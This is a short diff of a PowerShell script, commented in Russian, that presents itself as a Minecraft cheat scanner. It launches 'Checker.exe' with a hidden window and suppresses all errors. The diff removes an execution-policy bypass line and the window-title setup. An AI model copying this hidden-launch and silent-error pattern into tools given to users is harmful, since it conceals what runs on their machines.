@@ -5,11 +5,6 @@
     # Запускаем 
     Start-Process -FilePath "Checker.exe" -WindowStyle Hidden
 
-    
-Set-ExecutionPolicy Bypass -Scope Process -Force
-
-Clear-Host
-$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
 
 Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
 Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
@@ -100,6 +95,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
